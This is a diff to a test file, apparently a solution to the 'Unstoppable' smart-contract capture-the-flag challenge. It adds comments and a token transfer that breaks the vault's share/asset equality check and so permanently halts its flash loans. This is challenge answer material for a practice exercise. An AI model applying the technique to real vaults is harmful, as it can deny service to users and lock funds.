@@ -43,8 +43,10 @@ describe('[Challenge] Unstoppable', function () {
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
+    // Simply transfer tokens into the vault to disrupt the totalSupply reserves, then in the flashloan method on the UnstoppableVault contract, when it does the following : 
+    // if (convertToShares(totalSupply) != totalAssets()) revert InvalidBalance();
+    // The equality check will fail because the shares will mismatch the total assets
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
         await token
           .connect(player)
           .transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
